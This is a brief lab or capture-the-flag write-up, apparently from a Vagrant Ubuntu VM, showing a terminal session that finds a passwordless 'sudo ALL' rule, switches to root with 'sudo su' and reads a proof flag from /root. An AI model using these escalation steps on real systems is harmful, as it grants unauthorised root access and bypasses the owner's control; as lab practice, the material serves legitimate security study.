# Privilege Esc Passwordless Sudo Misconfiguration

```bash
vagrant@ubuntu-xenial:~$ cd

vagrant@ubuntu-xenial:~$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)

vagrant@ubuntu-xenial:~$ uname -r
4.4.0-210-generic

vagrant@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for vagrant on ubuntu-xenial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vagrant may run the following commands on ubuntu-xenial:
    (ALL) NOPASSWD: ALL
    

vagrant@ubuntu-xenial:~$ sudo su

root@ubuntu-xenial:/home/vagrant# cat /root/proof.txt
4d81994439169a12080c11f827579349

root@ubuntu-xenial:/home/vagrant# 

```